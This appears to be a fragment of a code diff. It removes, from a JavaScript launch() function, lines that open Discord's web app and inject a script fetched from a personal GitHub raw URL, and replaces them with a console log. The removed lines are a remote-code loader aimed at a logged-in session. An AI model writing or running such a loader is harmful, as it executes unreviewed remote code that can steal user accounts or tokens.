@@ -33,11 +33,5 @@ function send(){
 
 
 function launch(){
-  window.open("https://discord.com/channels/@me");
-  var script = document.createElement('script');
-      script.onload = function() {
-        alert("Loading..");
-      };
-      script.src = "https://raw.githubusercontent.com/SpacerYes/web555g/main/index.js";
-      document.getElementsByTagName('nonce')[0].appendChild(script);
+  console.log("Logged");
 }
